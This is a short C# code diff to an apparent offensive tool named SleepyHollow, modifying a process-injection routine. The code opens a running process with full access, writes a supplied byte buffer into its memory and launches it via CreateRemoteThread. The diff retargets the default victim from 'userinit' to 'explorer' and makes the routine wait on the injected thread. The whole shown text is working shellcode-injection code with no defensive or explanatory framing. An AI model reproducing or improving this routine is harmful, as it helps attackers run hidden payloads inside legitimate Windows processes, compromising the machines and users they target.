@@ -10,7 +10,7 @@ namespace SleepyHollow;
 /// </summary>
 internal static class InjectProcess
 {
-    internal static Task Run(byte[] buf, string processName = "userinit")
+    internal static Task Run(byte[] buf, string processName = "explorer")
     {
         var pid = Process.GetProcessesByName(processName)[0].Id;
         var hProcess = Lib.OpenProcess(OpenProcessFlags.PROCESS_ALL_ACCESS, false, pid);
@@ -19,7 +19,7 @@ internal static class InjectProcess
         Console.WriteLine("Bytes written to process memory: " + lpNumberOfBytesWritten);
         IntPtr hThread = Lib.CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpAddress, IntPtr.Zero, 0, IntPtr.Zero);
         Console.WriteLine($"Thread creation successful - Thread handle: 0x{hThread:x8}");
-
+        Lib.WaitForSingleObject(hThread, 0xFFFFFFFF);
         return Task.CompletedTask;
     }
 }
